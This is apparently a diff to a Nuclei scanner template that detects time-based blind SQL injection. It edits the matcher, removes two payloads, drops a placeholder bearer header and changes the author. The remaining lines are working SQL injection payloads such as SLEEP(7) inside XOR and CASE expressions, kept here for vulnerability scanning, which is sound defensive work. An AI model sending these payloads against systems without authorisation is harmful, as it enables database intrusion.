@@ -5,13 +5,9 @@ http:
     mode: single
     part: query
     type: replace
-  headers:
-    Authorization: Bearer eyasdsad.asdsad.asdsad
   matchers:
-  - condition: and
-    dsl:
-    - status_code == 200
-    - duration >= 7 && duration <= 16
+  - dsl:
+    - duration>=7 && duration <=16
     type: dsl
   method: GET
   path:
@@ -24,12 +20,10 @@ http:
     - if(now()=sysdate(),SLEEP(7),0)
     - '''XOR(if(now()=sysdate(),SLEEP(7),0))XOR''Z'
     - '''XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR''Z'
-    - XOR(if(now()=sysdate(),sleep(7),0))XOR
-    - 1%20AND%201337%3d(SELECT%201337%20FROM%20PG_SLEEP(7))--%201337
   stop-at-first-match: true
 id: time-based-sqli
 info:
-  author: KhukuriRimal
+  author: Rzizah github.com/rzizah
   description: Detects time-based blind SQL injection vulnerability
   name: Time-Based Blind SQL Injection
   severity: Critical
